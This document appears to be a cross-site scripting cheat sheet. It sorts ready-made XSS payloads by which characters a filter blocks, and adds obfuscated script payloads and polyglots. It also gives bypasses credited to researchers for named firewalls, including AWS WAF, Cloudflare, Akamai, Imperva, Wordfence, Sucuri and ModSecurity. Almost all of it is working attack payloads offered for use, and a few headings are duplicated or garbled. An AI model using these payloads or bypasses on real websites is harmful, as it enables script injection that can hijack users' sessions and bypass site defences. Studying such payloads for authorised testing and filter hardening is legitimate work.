### 1.If you cannot escape from the attribute (" is being encoded or deleted)

Try to use this payloads :
```js
1) <a href="javascript:alert(1)">Click</a>

2) <a href="&#01;javascript:alert(1)">Click</a>

3) <a href="javascript:{ alert`0` }">Click</a>

4) <a src="google.com" onclick="alert(1)">Click</a>

```
Or try to replace " with \u0022, > with \u003e and < with \u003c. So the payload will be:
```js
4) \u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022
```

### 2.If you can escape from the attribute but not from the tag (> is encoded or deleted)

Try to event handlers :
```js
1) <input   value"XXXXXXX"   onclick=alert(1)  >Click</input>

2) <input  type:"text" value="XSS"  accesskey="x" onclick="alert(1)" >

3) <img src=x  onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">

4) </div><a  src="google.com"  href="javaSCRIPT&colon;alert(/xss/)">XSS</a>

5) <a  href=https://google.com onclick=alert(document.location.hash.substring(1))#{saasasasas}>Click</a>
```
or use encodes:
```js
use Unicodes - UTF8 - UTF16 - UTF32
%3cscript%3e
%253cscript%253e
&lt;script&gt;

%u003Csvg onload=alert(1)>
%u3008svg onload=alert(2)> 
%uFF1Csvg onload=alert(3)>

Burp Suite > Convert Selection > HTML > HTML-encode all character
<a href="javascript:alert(1)">Click</a> =
&lt;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&quot;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;&gt;&#67;&#108;&#105;&#99;&#107;&lt;&#47;&#97;&gt;
```
### 3.If alert is encoded or deleted

Try to use this payloads :
```js
1) <script>$='',_=!$+$,$$=!_+$,$_=$+{},_$=_[$++],__=_[_$$=$],_$_=++_$$+$,$$$=$_[_$$+_$_],_[$$$+=$_[$]+(_.$$+$_)[$]+$$[_$_]+_$+__+_[_$$]+$$$+_$+$_[$]+__][$$$]($$[$]+$$[_$$]+_[_$_]+__+_$+"($)")()</script>

2) <script>[[,$,_,$$,__,$_,_$,$$$,$__,,___]=[![]+[]+!![]][+[]]+[][[]]],$$_=[][$+$_],[,,,$_$,,,_$$,,,,,__$,_$_]=[...$$_+[]],$_$+_$$+___+$$+$_+_$+$$$+$_$+$_+_$$+_$$$_[$_$+_$$+___+$$+$_+_$+$$$+$_$+$_+_$$+_$]($+_+__+_$+$_+__$+[+!!$]+_$_)()</script>

3) <script>([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+`(1)`)()</script>
   
4) <html>
   <body>
   <head>
   <meta charset="utf-8">   
   </head> 
   <script>
   ᐁ='',ᐃ=!ᐁ+ᐁ,ᐅ=!ᐃ+ᐁ
   ᐊ=ᐁ+{},ᐄ=ᐃ[ᐁ++],ᐆ=
   ᐃ[ᐋ=ᐁ],ᐒ=++ᐋ+ᐁ,ᐗ
   =ᐊ[ᐋ+ᐒ],ᐃ[ᐗ+=ᐊ[ᐁ]
   +(ᐃ.ᐅ+ᐊ)[ᐁ]+ᐅ[ᐒ]+ᐄ
   +ᐆ+ᐃ[ᐋ]+ᐗ+ᐄ+ᐊ[ᐁ]
   +ᐆ][ᐗ](ᐅ[ᐁ]+ᐅ[ᐋ]+ᐃ
   [ᐒ]+ᐆ+ᐄ+"`ᐁᐃ`")()
   </script>
   </html>
   </body>

5) <script>prompt(1)</script>

6) <a"/onclick=(confirm)()>Click Here!

7) <script>/&/-alert(1)</script>
<script>/&amp;/-alert(1)</script>

8) %00%00%00%00%00%00%00<script>alert(1)</script>     (1.Null bytes are output   2.There is no space character immediately before)

9) <sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`">

10) <bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click 

11) <script>alert.call(null,1)</script>   (alert.call(%20, "XSS");)

12) <script>confirm.call(null,1)</script>

13) <script>prompt.call(null,1)</script>

14) <script>alert.apply(null, [1])</script>
```

### 4.If space is encoded or deleted
```js
use tab url encode : %09
<input%09value"XXXXXXX"%09onclick=alert(1)>Click</input>
```

### 5.If () is encoded or deleted
```js
<script>alert`1`</script>
```

### 5.If <script> is encoded or deleted try other tags like:
```js
SVG, img, iframe 
```
   
### 6.Some WAF bypass:
```js
@vanshitmalhotra | Bypass AWS WAF -// 
Add "<!" (without quotes) before your payload and bypass that WAF. :)
eg: <!<script>confirm(1)</script>

@black0x00mamba | Bypass WAF Akamaighost & filtered onload, onclick, href, src, onerror, script, etc 
<img  sr%00c=x o%00nerror=((pro%00mpt(1)))>

DotDefender WAF bypass by @0xInfection 
<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme

@LooseSecurity | Updated CloudFlare bypass (bypasses virtually all WAF you'll encounter in the wild):
<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>
Javascript URI cushioned between carriage returns with a non-bracketed prompt.

@daveysec | Was able to bypass Imperva Incapsula WAF with:
<svg onload\r\n=$.globalEval("al"+"ert()");>

@rodolfoassis | Wordfence 7.4.2
<a href=&#01javascript:alert(1)>

rodolfoassis | Sucuri CloudProxy (POST only)
<a href=javascript&colon;confirm(1)>

rodolfoassis | ModSecurity CRS 3.2.0 PL1
<a href="jav%0Dascript&colon;alert(1)">
``` 

### 7.Some good stuffs:
```js
https://github.com/Walidhossain010/WAF-bypass-xss-payloads
https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057
```

### 7.XSS PolyglotsPolice: revolving allow you to test multiple XSS scenarios with ONE payload.  Work smarter not harder:
![xss](https://user-images.githubusercontent.com/63053441/148800150-58f87374-41ad-4ea8-8887-510c652c7452.jpg)
```js
-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

